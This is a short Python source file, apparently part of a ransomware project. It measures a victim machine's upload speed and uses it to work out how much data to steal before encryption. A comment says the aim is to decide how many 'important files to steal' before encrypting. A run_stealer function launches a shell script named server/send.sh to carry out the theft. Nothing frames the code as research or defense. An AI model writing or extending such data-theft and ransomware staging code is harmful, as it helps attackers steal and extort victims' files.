import subprocess
import speedtest

MAX_MINUTES_UPLOAD = 2
MIN_SPEED = 5


#-------------------------
s = speedtest.Speedtest()

s.get_best_server()

UPLOAD = s.upload()

print(f"{UPLOAD / 1_000_000:.2f} Mbit/s")
# to define how much data (importent files) to steal in x (time) before encrypt
# if mb/s too low go on
#--------------------------------------


def get_transfer_amount(upload_speed_mbit: float) -> int:

    # too slow
    if upload_speed_mbit < MIN_SPEED:
        return 100 * 1024 * 1024  # 100 MB fallback

    seconds = MAX_MINUTES_UPLOAD * 60

    # Mbit -> Bytes
    bytes_per_second = (upload_speed_mbit * 1_000_000) / 8

    total_bytes = bytes_per_second * seconds

    return int(total_bytes)



def run_stealer():
    result = subprocess.run(
        ["bash", "server/send.sh"],
        check=True, 
    )
